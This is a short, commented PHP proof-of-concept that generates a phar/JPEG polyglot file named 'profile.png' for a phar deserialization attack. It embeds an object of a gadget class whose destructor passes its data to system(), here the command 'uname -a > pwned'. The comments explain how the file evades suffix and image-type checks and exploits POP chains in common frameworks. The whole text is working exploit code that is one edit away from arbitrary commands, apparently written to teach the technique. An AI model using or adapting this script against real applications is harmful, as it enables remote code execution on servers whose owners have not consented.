<?php

# this is usually an open source third party
# public code the hacker knows / guesses the app uses
# for instance, Laravel / Symfony are known to have POP chains
class SomeClassTheAppLoaded {
    public $data = null;
    public function __construct($data) { $this->data = $data; }
    public function __destruct() { system($this->data); }
}

# suffix is free to be *anything*
# this would escape suffix check
# on the server ...
$phar = new Phar('profile.png');
$phar->startBuffering();

# phar files with phar:// prefix
# have special semantics for the / after their name
# it looks for files inside the archive ...
$phar->addFromString('test.txt', 'text');

# have some magic bytes of image format
# just in case the server checks that ...
$phar->setStub("\xff\xd8\xff\n<?php __HALT_COMPILER(); ?>");

// add object of any class as meta data
$object = new SomeClassTheAppLoaded('uname -a > pwned');
$phar->setMetadata($object);
$phar->stopBuffering();
